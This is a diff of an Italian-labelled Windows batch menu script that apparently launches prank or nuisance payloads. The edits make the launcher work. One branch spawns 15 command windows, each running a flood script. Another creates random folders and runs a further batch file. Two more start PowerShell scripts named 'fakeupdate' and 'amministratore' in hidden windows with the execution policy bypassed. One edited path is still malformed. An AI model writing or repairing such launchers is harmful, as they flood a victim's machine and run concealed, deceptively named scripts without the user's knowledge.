@@ -39,13 +39,13 @@ echo Scelta non valida.
 goto :start
 
 :c
-for /l %%i in (1,1,15) do start cmd /k Ciccio_flood.bat
+for /l %%i in (1,1,15) do start "" cmd /k "%~dp0Ciccio_flood.bat"
 pause
 goto:end
 
 :f
-md %random&
-start folder.bat
+md "%random%"
+start "" "%~dp0folder.bat"
 goto:end
 
 :b
@@ -74,11 +74,13 @@ if "%RETURN%"=="Y" goto :start
 goto:nome
 
 :fakeupdate
-start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "fakeupdate.ps1"
+start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0fakeupdate.ps1"
+pause
 goto:end
 
 :admin
-start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "amministratore.ps1"
+start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "~dp0amministratore.ps1"
+pause
 goto:end
 
 :end  
